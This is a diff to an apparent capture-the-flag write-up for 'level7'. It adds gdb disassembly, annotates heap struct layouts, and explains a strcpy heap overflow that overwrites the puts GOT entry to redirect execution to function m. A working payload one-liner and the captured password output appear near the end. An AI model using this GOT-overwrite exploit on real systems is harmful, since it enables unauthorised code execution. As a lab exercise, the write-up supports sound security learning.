@@ -63,6 +63,23 @@ main:
    0x08048602 <+225>:   ret
 ```
 
+m:
+```
+(gdb) disas m
+   0x080484f4 <+0>:     push   ebp
+   0x080484f5 <+1>:     mov    ebp,esp
+   0x080484f7 <+3>:     sub    esp,0x18
+   0x080484fa <+6>:     mov    DWORD PTR [esp],0x0
+   0x08048501 <+13>:    call   0x80483d0 <time@plt>
+   0x08048506 <+18>:    mov    edx,0x80486e0
+   0x0804850b <+23>:    mov    DWORD PTR [esp+0x8],eax
+   0x0804850f <+27>:    mov    DWORD PTR [esp+0x4],0x8049960
+   0x08048517 <+35>:    mov    DWORD PTR [esp],edx
+   0x0804851a <+38>:    call   0x80483b0 <printf@plt>
+   0x0804851f <+43>:    leave
+   0x08048520 <+44>:    ret
+```
+
 ```
 (gdb) r AAAABBBB CCCCDDDD
 ```
@@ -71,7 +88,7 @@ struct1:
 (gdb) x/xw $esp+0x1c
 0xbffff70c:     0x0804a008
 (gdb) x/2xw 0x0804a008
-0x804a008:      0x00000001      0x0804a018
+0x804a008:      0x00000001 // priority     0x0804a018 // name
 (gdb) x/4xw 0x0804a018
 0x804a018:      0x41414141      0x42424242      0x00000000      0x00000011
 ```
@@ -81,20 +98,24 @@ struct2:
 (gdb) x/xw $esp+0x18
 0xbffff718:     0x0804a028
 (gdb) x/2xw 0x0804a028
-0x804a028:      0x00000002      0x0804a038
+0x804a028:      0x00000002 // priority     0x0804a038 // name
 (gdb) x/4xw 0x0804a038
 0x804a038:      0x43434343      0x44444444      0x00000000      0x00000021
 ```
 
-argv[2] is copied into the address in the second argument of `struct2`. We can overrite this address
-by overflowing argv[1] which is copied into `struct1`, and puting the address of our injected shellcode.
+We found that main is using `strcpy` which is vulnerable to buffer overflow attacks, and we can see that there's couple of adjacent heap memory allocated
 
-We created `shellcode.py` to generate the payload, then pass it as argument.
 ```
-$ ./level7 $(python /tmp/shellcode.py)
-~~
-$ whoami
-level8
-$ cat /home/user/level8/.pass
+struct1                                       struct2
+[ priority | name address | name chunk        | priority | name address | name chunk        | ... ]
+```
+
+We can take advantage of this and overwrite the struct2 name address with the address of `puts` GOT entry, and then we can inject the address of function `m` into main's second argument and let the main write it into our puts GOT entry address.
+
+payload:
+```
+$ ./level7 $(python -c 'print "A"*20+"\x28\x99\x04\x08"') $(echo -n -e "\xf4\x84\x04\x08")
+
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1721671680
 ```
